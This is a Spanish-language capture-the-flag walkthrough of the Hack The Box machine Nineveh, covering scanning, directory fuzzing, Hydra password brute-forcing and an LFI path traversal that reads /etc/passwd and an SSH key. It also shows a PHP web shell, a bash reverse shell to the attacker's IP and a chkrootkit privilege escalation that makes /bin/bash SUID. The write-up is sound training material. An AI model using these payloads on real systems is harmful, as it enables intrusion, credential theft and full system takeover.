# Nineveh-htb

## NMAP 


```

 1100  sudo nmap -sS -T4 -p- --open -Pn -n 10.129.66.164 -oG ports
 1101  extractPorts ports
 1102  sudo nmap -sC -sV -p80,443 10.129.66.164 -oN Scan
 1103  sudo nmap --script "vuln and safe" -p80 10.129.66.164 -oN Scan80
 1104  sudo nmap --script "vuln and safe" -p443 10.129.66.164 -oN Scan80

```

## Dirbuster

Recuerda cuando tienes http y https se tiene que checar ambas.... son paginas separadas.

```
dirbuster -u https://nineveh.htb/ -t 200 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r dirout.ext -e php,txt,html
```

## FFUF



```
ffuf -c -fc 404 -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://nineveh.htb/FUZZ 
ffuf -c -fc 404 -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ 
```

## WFUZZ 

```
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ

```

Encontramos varios directorios.

```
https

File found: /index.html - 200
Dir found: /icons/ - 403
Dir found: /db/ - 200
File found: /db/index.php - 200
Dir found: /icons/small/ - 403
File found: /icons/README.html - 200


http

/department
```

## Metadata

Siempre es buena idea en estas maquinas y en los CTF checar los metadatos ( y cubrir todas las posibilidades)

```
exiftool ninevehForAll.png
strings ninve.png -n 10
steghide info nineveh.png
```

## HTTPS

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/c652fdd8-8f61-4569-b626-ee382b8a2307)


Podemos usar la opcion de -I de curl para que nos diga las cabeceras sin embargo si se trabaja con https necesitamos la opcion -k

```
curl -I https://nineveh.htb/ -k

```

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/0e7eb60f-fc11-4a9d-a50d-86133efa15a0)

## RCE

Con el firefox podemos sacar como se realiza un peticion post.

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/2f27a521-faab-41ed-843f-c1b4065e2ae8)

Ya que me parece que en el OSCP no se puede usar Burp Suite.

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/8c38e396-dec4-4eda-8b86-5b9ac07fe94e)

### Hydra 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.49.194  http-post-form "/department/login.php:username=a│    * FUZZ: YWRtaW46dGVzdAo=
dmin&password=^PASS^:Invalid" 
```
Si te das cuenta lo que cambia es el https en hydra mira  https-post-form.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.49.194  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"

```


Sacamos algunos passwords para admin y el otro para phpLiteAdmin v1.9

```
php
 login: admin   password: password123

db
login: admin   password: 1q2w3e4r5t

```

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/9d363814-3c40-4561-b111-2228c97af192)


### LFI

Ahi se ve que se podria aprobechar de que carga archivos solo hay que ver como. Una vez dentro podriamos y segun lo que se investigo crear una base de datos y pues hacer algo similar al posion log.

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

>https://github.com/chacka0101/exploits/blob/master/24044.txt

Para poder usar el LFI se usa apartir del punto.

```
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../etc/passwd
```

Rutas para LFI interesates enumerar via LFI:

```
/proc/net/tcp # Para listar puertos abiertos
cat ports.txt| awk -F":" '{print $3}' | awk '{print $1}' > ports2

hex_numeros = ["0050", "0016", "01BB", "0050", "0050"]

dec_numeros = [int(hex_num, 16) for hex_num in hex_numeros]

print(dec_numeros)

```

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/bea2648a-70d7-4a54-8b54-37e568c4fdc0)

Ver la version del sistama operativo

```
/etc/os-release

Ver las interfaces

/proc/net/fib_trie

```

Puedes ver procesos que existen en la maquina con 

```
/proc/sched_debug
# Para ver una id_rsa

/home/amrois/.ssh/id_rsa
```


### knock.d


![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/acd827d6-fe5f-43fd-874c-dae7b3dc4d8b)


Este es el servicio que permite el port knocking si golpeas los puertos en un orden se abre o cierda un puerto

```
sudo apt install knockd  
/etc/knockd.conf

knockd 10.10.10.43 571:tcp 290:tcp 911:tcp
```

### Alternativo  (pero esta no es la manera buena de hacerlo)

Encontramos el directorio /secure_notes/ y ahi vemos si hay algo interensante. Y ahi tenemos ya una clave privada ya que logramos abrir el puerto 22 pues ya te conectas (la clave privada estaba en la imagen).

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/abd7d041-ba3f-4519-9852-c25b348e3b84)


Recuerda dale los permisos 600.

Ahora vamos a crear una base de datos con extencion .php y con el LFI llamarlo.

```
<?php system($_REQUEST["cmd"]); ?>
```

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/1d5e03b8-9aff-443a-b57a-f8fd1c7262b0)


Recuerda poner %26 en lugar del & para que no de problemas
```
nineveh.htb/department/manage.php?notes=files/ninevehNotes../../../../../../../var/tmp/hack.php&cmd=bash -c "bash -i >&/dev/tcp/10.10.14.165/1234 0>&1"
```

Y listo tenemos la reverse shell. Algunas enumeraciones que se hicieron 

```
cat /etc/crontab
### Para ver las tareas que se van a ejecutar en los proximo min

systemctl list-timers
```

## Privilege Esca

Con las herramientas para ver procesos vemos que se esta ejecutando el /usr/bin/chkrootkit. esto premite encontrar rootkits conocidos.

```
searchsploit chkrootkit
```

Esto tiene la vulnerabilidad de que ejecuta en /tmp update crea un script para hacer SUID la /bin/bash. Primero hacemo una full tty.

```
script /dev/null -c bash
CTRL + Z
#stty -echo raw;fg
             reset
xtem
export TERM=xterm
export SHELL=/bin/bash
nano update


#!/bin/bash

chmod u+s /bin/bash
```

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/130d1dd8-4c00-4437-8db0-c402a35011d5)

Y para que veamos el contenido de manage.php el cual tenia un white list:

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/f29b3938-0ef0-4c19-ad3e-83e3b1a9ce8d)

Que nos dice chatgtp

![image](https://github.com/gecr07/Nineveh-htb/assets/63270579/2d47477d-45b7-45b9-b7f5-a8e5ad5c6037)

FIN
